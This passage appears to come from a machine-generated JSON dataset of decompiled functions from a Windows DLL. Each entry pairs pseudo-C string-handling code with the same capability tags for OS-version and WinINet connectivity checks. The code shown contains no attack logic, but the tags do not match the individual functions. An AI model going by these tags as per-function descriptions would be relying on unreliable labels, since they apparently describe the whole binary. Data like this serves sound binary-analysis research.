        "decompiled_code": "\nvoid fcn.18005f9c0(ulong noname_0, ushort *arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong ****ppppuVar3;\n    uchar auStack104 [32];\n    ulong uStack72;\n    ushort *puStack64;\n    ulong ****appppuStack56 [2];\n    ulong uStack40;\n    uint64_t uStack32;\n    uint64_t uStack24;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack104;\n    uStack40 = 0;\n    uStack32 = 7;\n    appppuStack56[0] = appppuStack56[0] & 0xffffffffffff0000;\n    puStack64 = arg2;\n    appppuStack56[0] = fcn.180011cf0(appppuStack56, 0x108);\n    uStack40 = 0x104;\n    uStack32 = 0x107;\n    ppppuVar3 = appppuStack56[0];\n    for (iVar2 = 0x104; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *ppppuVar3 = 0;\n        ppppuVar3 = ppppuVar3 + 2;\n    }\n    *(appppuStack56[0] + 0x41) = 0;\n    (**0x1800de7f0)(*0x18012a390, 0xfb9, 0x104, appppuStack56[0]);\n    ppppuVar3 = appppuStack56;\n    if (7 < uStack32) {\n        ppppuVar3 = appppuStack56[0];\n    }\n    *(arg2 + 8) = 0;\n    *(arg2 + 0xc) = 7;\n    *arg2 = 0;\n    iVar2 = -1;\n    do {\n        iVar2 = iVar2 + 1;\n    } while (*(ppppuVar3 + iVar2 * 2) != 0);\n    fcn.180010d70(arg2, ppppuVar3, iVar2);\n    if (7 < uStack32) {\n        ppppuVar3 = appppuStack56[0];\n        if (0xfff < uStack32 * 2 + 2) {\n            ppppuVar3 = appppuStack56[0][-1];\n            if (0x1f < appppuStack56[0] + (-8 - ppppuVar3)) {\n                fcn.1800b3528(ppppuVar3, uStack32 * 2 + 0x29);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(ppppuVar3);\n    }\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 659
    },
    "18005fb1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18005fb10(uint64_t *arg1, ulong noname_1, uint64_t **arg3)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint16_t **ppuVar4;\n    uchar (*pauVar5) [16];\n    uint64_t uVar6;\n    uint64_t **ppuVar7;\n    uint64_t *puVar8;\n    uint64_t *puVar9;\n    uint64_t *puVar10;\n    uint64_t **arg2;\n    uint32_t uVar11;\n    int64_t iVar12;\n    uint16_t **ppuVar13;\n    bool bVar14;\n    bool bVar15;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar auVar16 [16];\n    ulong var_10h_2;\n    ulong var_30h;\n    uchar auStack376 [32];\n    uint32_t uStack344;\n    uint64_t *puStack336;\n    uint uStack328;\n    uint uStack324;\n    uchar auStack320 [16];\n    ulong uStack304;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint64_t *puStack272;\n    ulong uStack264;\n    uint64_t **ppuStack256;\n    uchar (*apauStack248 [2]) [16];\n    uint64_t *puStack232;\n    uint64_t uStack224;\n    uchar auStack216 [16];\n    uint64_t *puStack200;\n    uint64_t uStack192;\n    uchar auStack184 [16];\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    ulong var_80h;\n    uint uStack128;\n    uint uStack124;\n    ulong var_bp_70h;\n    ulong var_bp_68h;\n    ulong var_60h;\n    uint uStack96;\n    uint uStack92;\n    ulong var_50h;\n    ulong var_48h;\n    uint64_t var_40h;\n    ulong var_30h_2;\n    ulong var_bp_20h;\n    ulong var_10h;\n    \n    uStack264 = 0xfffffffffffffffe;\n    var_40h = *0x180123080 ^ auStack376;\n    uStack344 = 0;\n    puVar8 = arg1;\n    puStack272 = arg1;\n    ppuStack256 = arg3;\n    fcn.18005f9c0(arg1, apauStack248);\n    for (ppuVar13 = arg1[0x21]; ppuVar13 != arg1[0x22]; ppuVar13 = ppuVar13 + 0x11) {\n        ppuVar4 = ppuVar13;\n        if (0x7 < ppuVar13[3]) {\n            ppuVar4 = *ppuVar13;\n        }\n        pauVar5 = apauStack248;\n        if (7 < uStack224) {\n            pauVar5 = apauStack248[0];\n        }\n        if (puStack232 == ppuVar13[2]) {\n            if (puStack232 == NULL) {\ncode_r0x00018005fbf1:\n                ppuVar7 = ppuVar13 + 4;\n                if (noname_1 == '\\0') {\n                    ppuVar7 = ppuVar13 + 8;\n                }\n                if (ppuVar7 != arg3) {\n                    arg2 = arg3;\n                    if (0xf < arg3[3]) {\n                        arg2 = *arg3;\n                    }\n                    fcn.180011120(ppuVar7, arg2, arg3[2]);\n                }\n                if (7 < uStack224) {\n                    pauVar5 = apauStack248[0];\n                    if ((0xfff < uStack224 * 2 + 2) &&\n                       (pauVar5 = *(apauStack248[0][-1] + 8),  0x1f < apauStack248[0] + (-8 - pauVar5)))\n                    goto code_r0x00018006014c;\n                    fcn.18008fb24(pauVar5);\n                }\n                if (0xf < arg3[3]) {\n                    puVar8 = *arg3;\n                    puVar10 = puVar8;\n                    if ((0xfff < arg3[3] + 1U) && (puVar10 = puVar8[-1],  0x1f < puVar8 + (-8 - puVar10)))\n                    goto code_r0x000180060152;\n                    fcn.18008fb24(puVar10);\n                }\n                arg3[2] = NULL;\n                goto code_r0x00018006011a;\n            }\n            uVar1 = **pauVar5;\n            uVar2 = *ppuVar4;\n            puVar8 = puStack232;\n            if (uVar2 <= uVar1) {\n                iVar12 = pauVar5 - ppuVar4;\n                bVar14 = uVar1 < uVar2;\n                bVar15 = uVar1 == uVar2;\n                do {\n                    if (!bVar14 && !bVar15) break;\n                    if (puVar8 == 0x1) goto code_r0x00018005fbf1;\n                    puVar8 = puVar8 + -1;\n                    ppuVar4 = ppuVar4 + 2;\n                    uVar1 = *(iVar12 + ppuVar4);\n                    bVar14 = uVar1 < *ppuVar4;\n                    bVar15 = uVar1 == *ppuVar4;\n                } while (!bVar14);\n            }\n        }\n    }\n    pauVar5 = apauStack248;\n    if (7 < uStack224) {\n        pauVar5 = apauStack248[0];\n    }\n    if (puStack232 < 0x8) {\n        auVar16 = *pauVar5;\n        auStack216 = auVar16;\n        uStack192 = 7;\n    }\n    else {\n        uStack192 = puStack232 | 7;\n        if (0x7ffffffffffffffe < uStack192) {\n            uStack192 = 0x7ffffffffffffffe;\n        }\n        puVar8 = fcn.180011cf0(auStack216, uStack192 + 1);\n        auStack216 = CONCAT88(auStack216._8_8_, puVar8);\n        fcn.1800ade80(puVar8, pauVar5, puStack232 * 2 + 2);\n        auVar16 = extraout_XMM0;\n    }\n    puStack200 = puStack232;\n    if (noname_1 == '\\0') {\n        uStack288 = *0x180101910;\n        uStack284 = *0x180101914;\n        uStack280 = *0x180101918;\n        uStack276 = *0x18010191c;\n        uStack304._0_1_ = 0;\n        puVar8 = &uStack304;\n        fcn.180011120(puVar8, 0x1800f4ae6, 0);\n        pauVar5 = &uStack304;\n        uVar11 = 2;\ncode_r0x00018005fdfa:\n        auVar16 = *pauVar5;\n        auStack184 = auVar16;\n        uStack168 = *pauVar5[1];\n        uStack164 = *(pauVar5[1] + 4);\n        uStack160 = *(pauVar5[1] + 8);\n        uStack156 = *(pauVar5[1] + 0xc);\n        *pauVar5[1] = 0;\n        *(pauVar5[1] + 8) = 0xf;\n        (*pauVar5)[0] = 0;\n        uStack344 = uVar11;\n        if ((uVar11 & 2) != 0) {\n            uVar11 = uVar11 & 0xfffffffd;\n            uStack344 = uVar11;\n            if (CONCAT44(uStack276, uStack280) < 0x10) goto code_r0x00018005fe69;\n            puVar10 = CONCAT71(uStack304._1_7_, uStack304);\n            puVar8 = puVar10;\n            if ((CONCAT44(uStack276, uStack280) + 1 < 0x1000) || (puVar8 = puVar10[-1],  puVar10 + (-8 - puVar8) < 0x20)\n               ) {\n                fcn.18008fb24(puVar8);\n                auVar16 = extraout_XMM0_00;\n                goto code_r0x00018005fe69;\n            }\n            goto code_r0x00018006015e;\n        }\ncode_r0x00018005fe69:\n        if ((uVar11 & 1) != 0) {\n            uStack344 = uVar11 & 0xfffffffe;\n            if (0xf < auStack320._8_8_) {\n                puVar8 = puStack336;\n                if ((0xfff < auStack320._8_8_ + 1) && (puVar8 = puStack336[-1],  0x1f < puStack336 + (-8 - puVar8)))\n                goto code_r0x00018006016a;\n                fcn.18008fb24(puVar8);\n                auVar16 = extraout_XMM0_01;\n            }\n        }\n        if (noname_1 == '\\0') {\n            auStack320 = auVar16 & 0x0;\n            puVar10 = arg3[2];\n            ppuVar7 = arg3;\n            if (0xf < arg3[3]) {\n                ppuVar7 = *arg3;\n            }\n            if (puVar10 < 0x10) {\n                puStack336 = *ppuVar7;\n                uStack328 = *(ppuVar7 + 1);\n                uStack324 = *(ppuVar7 + 0xc);\n                auStack320._8_8_ = 0xf;\n            }\n            else {\n                auStack320._8_8_ = puVar10 | 0xf;\n                if (0x7fffffffffffffff < auStack320._8_8_) {\n                    auStack320._8_8_ = 0x7fffffffffffffff;\n                }\n                puVar8 = auStack320._8_8_ + 1;\n                if (puVar8 < 0x1000) {\n                    if (puVar8 != NULL) {\n                        puVar8 = fcn.18008fb2c(puVar8);\n                    }\n                }\n                else {\n                    puVar9 = auStack320._8_8_ + 0x28;\n                    if (puVar9 <= puVar8) {\n                        puVar9 = 0xffffffffffffffff;\n                    }\n                    uVar6 = fcn.18008fb2c(puVar9);\n                    if (uVar6 == 0) goto code_r0x00018006016a;\n                    puVar8 = uVar6 + 0x27 & 0xffffffffffffffe0;\n                    puVar8[-1] = uVar6;\n                }\n                puStack336 = puVar8;\n                fcn.1800ade80(puVar8, ppuVar7, puVar10 + 1);\n            }\n            auStack320 = CONCAT88(auStack320._8_8_, puVar10);\n            ppuVar7 = &puStack336;\n            bVar15 = true;\n            bVar14 = false;\n        }\n        else {\n            uStack288 = *0x180101910;\n            uStack284 = *0x180101914;\n            uStack280 = *0x180101918;\n            uStack276 = *0x18010191c;\n            uStack304._0_1_ = 0;\n            puVar8 = &uStack304;\n            fcn.180011120(puVar8, 0x1800f4abf, 0);\n            ppuVar7 = &uStack304;\n            bVar15 = false;\n            bVar14 = true;\n        }\n        uStack152 = *ppuVar7;\n        uStack148 = *(ppuVar7 + 4);\n        uStack144 = *(ppuVar7 + 1);\n        uStack140 = *(ppuVar7 + 0xc);\n        var_80h._0_4_ = *(ppuVar7 + 2);\n        var_80h._4_4_ = *(ppuVar7 + 0x14);\n        uStack128 = *(ppuVar7 + 3);\n        uStack124 = *(ppuVar7 + 0x1c);\n        ppuVar7[2] = NULL;\n        ppuVar7[3] = 0xf;\n        *ppuVar7 = 0;\n        if ((!bVar14) || (CONCAT44(uStack276, uStack280) < 0x10)) {\ncode_r0x00018006000f:\n            if ((bVar15) && (0xf < auStack320._8_8_)) {\n                puVar8 = puStack336;\n                if ((0xfff < auStack320._8_8_ + 1) && (puVar8 = puStack336[-1],  0x1f < puStack336 + (-8 - puVar8)))\n                goto code_r0x00018006016a;\n                fcn.18008fb24(puVar8);\n            }\n            puVar10 = puStack272;\n            var_60h._0_4_ = *0x180101910;\n            var_60h._4_4_ = *0x180101914;\n            uStack96 = *0x180101918;\n            uStack92 = *0x18010191c;\n            var_bp_70h._0_1_ = 0;\n            var_50h._0_1_ = 0;\n            uVar6 = puStack272[0x22];\n            if (uVar6 == puStack272[0x23]) {\n                fcn.180063970(puStack272 + 0x21, uVar6, auStack216);\n            }\n            else {\n                fcn.180063900(puVar8, uVar6, auStack216);\n                puVar10[0x22] = puVar10[0x22] + 0x88;\n            }\n            fcn.180060170(auStack216);\n            if (uStack224 < 8) {\ncode_r0x0001800600e0:\n                if (arg3[3] < 0x10) {\ncode_r0x000180060116:\n                    arg3[2] = NULL;\ncode_r0x00018006011a:\n                    *arg3 = 0;\n                    arg3[3] = 0xf;\n                    fcn.18008fb00(var_40h ^ auStack376);\n                    return;\n                }\n                puVar8 = *arg3;\n                puVar10 = puVar8;\n                if ((arg3[3] + 1U < 0x1000) || (puVar10 = puVar8[-1],  puVar8 + (-8 - puVar10) < 0x20)) {\n                    fcn.18008fb24(puVar10);\n                    goto code_r0x000180060116;\n                }\n            }\n            else {\n                pauVar5 = apauStack248[0];\n                if ((uStack224 * 2 + 2 < 0x1000) ||\n                   (pauVar5 = *(apauStack248[0][-1] + 8),  apauStack248[0] + (-8 - pauVar5) < 0x20)) {\n                    fcn.18008fb24(pauVar5);\n                    goto code_r0x0001800600e0;\n                }\ncode_r0x00018006014c:\n                fcn.1800b3528();\n            }\ncode_r0x000180060152:\n            fcn.1800b3528();\n            goto code_r0x000180060158;\n        }\n        puVar10 = CONCAT71(uStack304._1_7_, uStack304);\n        puVar8 = puVar10;\n        if ((CONCAT44(uStack276, uStack280) + 1 < 0x1000) || (puVar8 = puVar10[-1],  puVar10 + (-8 - puVar8) < 0x20)) {\n            fcn.18008fb24(puVar8);\n            goto code_r0x00018006000f;\n        }\n    }\n    else {\n        auStack320 = auVar16 & 0x0;\n        puVar10 = arg3[2];\n        ppuVar7 = arg3;\n        if (0xf < arg3[3]) {\n            ppuVar7 = *arg3;\n        }\n        if (puVar10 < 0x10) {\n            puStack336 = *ppuVar7;\n            uStack328 = *(ppuVar7 + 1);\n            uStack324 = *(ppuVar7 + 0xc);\n            auStack320._8_8_ = 0xf;\ncode_r0x00018005fdb8:\n            auStack320 = CONCAT88(auStack320._8_8_, puVar10);\n            pauVar5 = &puStack336;\n            uVar11 = 1;\n            goto code_r0x00018005fdfa;\n        }\n        auStack320._8_8_ = puVar10 | 0xf;\n        if (0x7fffffffffffffff < auStack320._8_8_) {\n            auStack320._8_8_ = 0x7fffffffffffffff;\n        }\n        puVar8 = auStack320._8_8_ + 1;\n        if (puVar8 < 0x1000) {\n            if (puVar8 != NULL) {\n                puVar8 = fcn.18008fb2c(puVar8);\n            }\ncode_r0x00018005fd9f:\n            puStack336 = puVar8;\n            fcn.1800ade80(puVar8, ppuVar7, puVar10 + 1);\n            goto code_r0x00018005fdb8;\n        }\n        puVar9 = auStack320._8_8_ + 0x28;\n        if (puVar9 <= puVar8) {\n            puVar9 = 0xffffffffffffffff;\n        }\n        uVar6 = fcn.18008fb2c(puVar9);\n        if (uVar6 != 0) {\n            puVar8 = uVar6 + 0x27 & 0xffffffffffffffe0;\n            puVar8[-1] = uVar6;\n            goto code_r0x00018005fd9f;\n        }\ncode_r0x000180060158:\n        fcn.1800b3528();\ncode_r0x00018006015e:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018006016a:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 4384
    },
    "1800602c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.1800602c0(int64_t arg1, uint16_t **arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint16_t **ppuVar4;\n    uint16_t *puVar5;\n    ulong ******ppppppuVar6;\n    uint16_t **ppuVar7;\n    int64_t iVar8;\n    bool bVar9;\n    bool bVar10;\n    uchar auStack104 [32];\n    ulong uStack72;\n    ulong ******appppppuStack64 [2];\n    uint16_t *puStack48;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack104;\n    fcn.18005f9c0(arg1, appppppuStack64);\n    fcn.180011120(arg2, 0x1800f4ae7, 0);\n    ppuVar7 = *(arg1 + 0x108);\n    do {\n        if (ppuVar7 == *(arg1 + 0x110)) {\ncode_r0x0001800603b9:\n            if (7 < uStack40) {\n                ppppppuVar6 = appppppuStack64[0];\n                if ((0xfff < uStack40 * 2 + 2) &&\n                   (ppppppuVar6 = appppppuStack64[0][-1],  0x1f < appppppuStack64[0] + (-8 - ppppppuVar6))) {\n                    fcn.1800b3528();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                fcn.18008fb24(ppppppuVar6);\n            }\n            fcn.18008fb00(uStack32 ^ auStack104);\n            return;\n        }\n        ppuVar4 = ppuVar7;\n        if (0x7 < ppuVar7[3]) {\n            ppuVar4 = *ppuVar7;\n        }\n        ppppppuVar6 = appppppuStack64;\n        if (7 < uStack40) {\n            ppppppuVar6 = appppppuStack64[0];\n        }\n        if (puStack48 == ppuVar7[2]) {\n            if (puStack48 == NULL) {\ncode_r0x00018006039a:\n                ppuVar4 = ppuVar7 + 4;\n                if (arg2 != ppuVar4) {\n                    if (0xf < ppuVar7[7]) {\n                        ppuVar4 = *ppuVar4;\n                    }\n                    fcn.180011120(arg2, ppuVar4, ppuVar7[6]);\n                }\n                goto code_r0x0001800603b9;\n            }\n            uVar1 = *ppppppuVar6;\n            uVar2 = *ppuVar4;\n            if (uVar2 <= uVar1) {\n                iVar8 = ppppppuVar6 - ppuVar4;\n                bVar9 = uVar1 < uVar2;\n                bVar10 = uVar1 == uVar2;\n                puVar5 = puStack48;\n                do {\n                    if (!bVar9 && !bVar10) break;\n                    if (puVar5 == 0x1) goto code_r0x00018006039a;\n                    puVar5 = puVar5 + -1;\n                    ppuVar4 = ppuVar4 + 2;\n                    uVar1 = *(iVar8 + ppuVar4);\n                    bVar9 = uVar1 < *ppuVar4;\n                    bVar10 = uVar1 == *ppuVar4;\n                } while (!bVar9);\n            }\n        }\n        ppuVar7 = ppuVar7 + 0x11;\n    } while( true );\n}\n",
        "token_count": 881
    },
    "18006042": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180060420(int64_t arg1, uint16_t *arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint16_t **ppuVar4;\n    ulong arg1_00;\n    uint16_t *arg1_01;\n    uint16_t *puVar5;\n    uchar *arg1_02;\n    uint16_t *puVar6;\n    uint16_t **ppuVar7;\n    int64_t iVar8;\n    bool bVar9;\n    bool bVar10;\n    uchar auStack400 [32];\n    ulong uStack368;\n    uchar *puStack360;\n    uint16_t *puStack352;\n    uint16_t *puStack336;\n    uint64_t uStack328;\n    uint64_t uStack320;\n    uint16_t *puStack304;\n    uint64_t uStack296;\n    uint16_t *puStack288;\n    uchar auStack280 [24];\n    uint16_t **ppuStack256;\n    ulong uStack248;\n    uint16_t *puStack240;\n    uint64_t uStack216;\n    uchar auStack200 [128];\n    uint16_t *puStack72;\n    uint16_t *puStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    \n    uStack248 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ &stack0xfffffffffffffee8;\n    puStack288 = 0x18006045b;\n    fcn.18005f9c0(arg1, &stack0xffffffffffffffb8);\n    puStack288 = 0x18006046e;\n    arg1_01 = arg2;\n    fcn.180010d70(arg2, 0x1800f96f4, 0);\n    ppuStack256 = *(arg1 + 0x110);\n    for (ppuVar7 = *(arg1 + 0x108); ppuVar7 != ppuStack256; ppuVar7 = ppuVar7 + 0x11) {\n        ppuVar4 = ppuVar7;\n        if (0x7 < ppuVar7[3]) {\n            ppuVar4 = *ppuVar7;\n        }\n        puVar6 = &stack0xffffffffffffffb8;\n        if (7 < uStack48) {\n            puVar6 = puStack72;\n        }\n        if (puStack56 == ppuVar7[2]) {\n            arg1_01 = puStack56;\n            if (puStack56 != NULL) {\n                uVar1 = *puVar6;\n                uVar2 = *ppuVar4;\n                if (uVar2 <= uVar1) {\n                    iVar8 = puVar6 - ppuVar4;\n                    bVar9 = uVar1 < uVar2;\n                    bVar10 = uVar1 == uVar2;\n                    do {\n                        if (!bVar9 && !bVar10) break;\n                        if (arg1_01 == 0x1) goto code_r0x000180060515;\n                        arg1_01 = arg1_01 + -1;\n                        ppuVar4 = ppuVar4 + 2;\n                        uVar1 = *(iVar8 + ppuVar4);\n                        bVar9 = uVar1 < *ppuVar4;\n                        bVar10 = uVar1 == *ppuVar4;\n                    } while (!bVar9);\n                }\n                goto code_r0x0001800604fe;\n            }\ncode_r0x000180060515:\n            bVar9 = true;\n        }\n        else {\ncode_r0x0001800604fe:\n            bVar9 = false;\n        }\n        if (bVar9) {\n            ppuStack256 = ppuVar7 + 8;\n            puStack288 = 0x180060527;\n            arg1_00 = fcn.1800687b0(&stack0xffffffffffffff38);\n            ppuVar4 = ppuStack256;\n            if (0xf < ppuVar7[0xb]) {\n                ppuVar4 = *ppuStack256;\n            }\n            puStack288 = 0x180060549;\n            fcn.180069050(arg1_00, &stack0xffffffffffffff10, ppuVar4, ppuVar7[10] + ppuVar4);\n            puStack288 = 0x180060554;\n            fcn.1800686c0(&stack0xffffffffffffff38);\n            puStack288 = 0x180060561;\n            arg1_01 = arg2;\n            fcn.18000d960(arg2, &stack0xffffffffffffff10);\n            if (7 < uStack216) {\n                arg1_01 = puStack240;\n                if (0xfff < uStack216 * 2 + 2) {\n                    arg1_02 = uStack216 * 2 + 0x29;\n                    arg1_01 = *(puStack240 + -4);\n                    if (0x1f < puStack240 + (-8 - arg1_01)) goto code_r0x00018006060a;\n                }\n                puStack288 = 0x18006059f;\n                fcn.18008fb24(arg1_01);\n            }\n            break;\n        }\n    }\n    ppuStack256 = ppuStack256 & 0xffffffffffffff00 | *(arg2 + 8) != 0;\n    if (7 < uStack48) {\n        puVar6 = puStack72;\n        if (0xfff < uStack48 * 2 + 2) {\n            arg1_02 = uStack48 * 2 + 0x29;\n            puVar6 = *(puStack72 + -4);\n            if (0x1f < puStack72 + (-8 - puVar6)) {\n                puStack288 = 0x180060609;\n                fcn.1800b3528();\n                puStack72 = puVar6;\ncode_r0x00018006060a:\n                puStack288 = 0x18006060f;\n                fcn.1800b3528();\n                uStack296 = uStack48;\n                uStack368 = 0xfffffffffffffffe;\n                uStack320 = *0x180123080 ^ &stack0xfffffffffffffe70;\n                puStack360 = arg1_02;\n                puStack304 = puStack72;\n                puStack288 = arg2;\n                fcn.18005f9c0(arg1_01, &stack0xfffffffffffffea0);\n                for (ppuVar7 = *(arg1_01 + 0x84); puVar6 = puStack352,  ppuVar7 != *(arg1_01 + 0x88);\n                    ppuVar7 = ppuVar7 + 0x11) {\n                    ppuVar4 = ppuVar7;\n                    if (0x7 < ppuVar7[3]) {\n                        ppuVar4 = *ppuVar7;\n                    }\n                    puVar5 = &stack0xfffffffffffffea0;\n                    if (7 < uStack328) {\n                        puVar5 = puStack352;\n                    }\n                    if (puStack336 == ppuVar7[2]) {\n                        if (puStack336 == NULL) {\ncode_r0x000180060732:\n                            fcn.18000de50(arg1_02, ppuVar7 + 0xc);\n                            if (uStack328 < 8) goto code_r0x000180060776;\n                            if ((uStack328 * 2 + 2 < 0x1000) ||\n                               (puVar6 = *(puStack352 + -4),  puStack352 + (-8 - puVar6) < 0x20))\n                            goto code_r0x00018006076e;\n                            goto code_r0x000180060796;\n                        }\n                        uVar1 = *puVar5;\n                        uVar2 = *ppuVar4;\n                        if (uVar2 <= uVar1) {\n                            iVar8 = puVar5 - ppuVar4;\n                            bVar9 = uVar1 < uVar2;\n                            bVar10 = uVar1 == uVar2;\n                            puVar5 = puStack336;\n                            do {\n                                if (!bVar9 && !bVar10) break;\n                                if (puVar5 == 0x1) goto code_r0x000180060732;\n                                puVar5 = puVar5 + -1;\n                                ppuVar4 = ppuVar4 + 2;\n                                uVar1 = *(iVar8 + ppuVar4);\n                                bVar9 = uVar1 < *ppuVar4;\n                                bVar10 = uVar1 == *ppuVar4;\n                            } while (!bVar9);\n                        }\n                    }\n                }\n                *(arg1_02 + 0x10) = 0;\n                *(arg1_02 + 0x18) = 0xf;\n                *arg1_02 = 0;\n                fcn.180011120(arg1_02, 0x1800f4b9a, 0);\n                if (7 < uStack328) {\n                    if ((0xfff < uStack328 * 2 + 2) && (puVar6 = *(puStack352 + -4),  0x1f < puStack352 + (-8 - puVar6))\n                       ) {\ncode_r0x000180060796:\n                        fcn.1800b3528();\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\ncode_r0x00018006076e:\n                    fcn.18008fb24(puVar6);\n                }\ncode_r0x000180060776:\n                fcn.18008fb00(uStack320 ^ &stack0xfffffffffffffe70);\n                return;\n            }\n        }\n        puStack288 = 0x1800605de;\n        fcn.18008fb24(puVar6);\n    }\n    puStack288 = 0x1800605f1;\n    fcn.18008fb00(uStack40 ^ &stack0xfffffffffffffee8);\n    return;\n}\n",
        "token_count": 2224
    },
    "18006061": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180060610(int64_t arg1, uchar *arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint16_t **ppuVar4;\n    uint16_t *puVar5;\n    ulong ****ppppuVar6;\n    uint16_t **ppuVar7;\n    ulong ****ppppuVar8;\n    int64_t iVar9;\n    bool bVar10;\n    bool bVar11;\n    uchar auStack120 [32];\n    ulong uStack88;\n    uchar *puStack80;\n    ulong ****appppuStack72 [2];\n    uint16_t *puStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack120;\n    puStack80 = arg2;\n    fcn.18005f9c0(arg1, appppuStack72);\n    for (ppuVar7 = *(arg1 + 0x108); ppppuVar6 = appppuStack72[0],  ppuVar7 != *(arg1 + 0x110); ppuVar7 = ppuVar7 + 0x11)\n    {\n        ppuVar4 = ppuVar7;\n        if (0x7 < ppuVar7[3]) {\n            ppuVar4 = *ppuVar7;\n        }\n        ppppuVar8 = appppuStack72;\n        if (7 < uStack48) {\n            ppppuVar8 = appppuStack72[0];\n        }\n        if (puStack56 == ppuVar7[2]) {\n            if (puStack56 == NULL) {\ncode_r0x000180060732:\n                fcn.18000de50(arg2, ppuVar7 + 0xc);\n                if (uStack48 < 8) goto code_r0x000180060776;\n                if ((uStack48 * 2 + 2 < 0x1000) ||\n                   (ppppuVar6 = appppuStack72[0][-1],  appppuStack72[0] + (-8 - ppppuVar6) < 0x20))\n                goto code_r0x00018006076e;\n                goto code_r0x000180060796;\n            }\n            uVar1 = *ppppuVar8;\n            uVar2 = *ppuVar4;\n            if (uVar2 <= uVar1) {\n                iVar9 = ppppuVar8 - ppuVar4;\n                bVar10 = uVar1 < uVar2;\n                bVar11 = uVar1 == uVar2;\n                puVar5 = puStack56;\n                do {\n                    if (!bVar10 && !bVar11) break;\n                    if (puVar5 == 0x1) goto code_r0x000180060732;\n                    puVar5 = puVar5 + -1;\n                    ppuVar4 = ppuVar4 + 2;\n                    uVar1 = *(iVar9 + ppuVar4);\n                    bVar10 = uVar1 < *ppuVar4;\n                    bVar11 = uVar1 == *ppuVar4;\n                } while (!bVar10);\n            }\n        }\n    }\n    *(arg2 + 0x10) = 0;\n    *(arg2 + 0x18) = 0xf;\n    *arg2 = 0;\n    fcn.180011120(arg2, 0x1800f4b9a, 0);\n    if (7 < uStack48) {\n        if ((0xfff < uStack48 * 2 + 2) &&\n           (ppppuVar6 = appppuStack72[0][-1],  0x1f < appppuStack72[0] + (-8 - ppppuVar6))) {\ncode_r0x000180060796:\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\ncode_r0x00018006076e:\n        fcn.18008fb24(ppppuVar6);\n    }\ncode_r0x000180060776:\n    fcn.18008fb00(uStack40 ^ auStack120);\n    return;\n}\n",
        "token_count": 961
    },
    "1800607a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.1800607a0(int64_t arg1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint16_t **ppuVar4;\n    uint16_t **ppuVar5;\n    uint16_t *puVar6;\n    uint16_t **ppuVar7;\n    ulong ****ppppuVar8;\n    bool bVar9;\n    bool bVar10;\n    uchar auStack88 [32];\n    ulong ****appppuStack56 [2];\n    uint16_t *puStack40;\n    uint64_t uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack88;\n    fcn.18005f9c0(arg1, appppuStack56);\n    for (ppuVar7 = *(arg1 + 0x108); ppuVar7 != *(arg1 + 0x110); ppuVar7 = ppuVar7 + 0x11) {\n        ppuVar4 = ppuVar7;\n        if (0x7 < ppuVar7[3]) {\n            ppuVar4 = *ppuVar7;\n        }\n        ppppuVar8 = appppuStack56;\n        if (7 < uStack32) {\n            ppppuVar8 = appppuStack56[0];\n        }\n        if (puStack40 == ppuVar7[2]) {\n            if (puStack40 == NULL) break;\n            uVar1 = *ppppuVar8;\n            uVar2 = *ppuVar4;\n            if (uVar2 <= 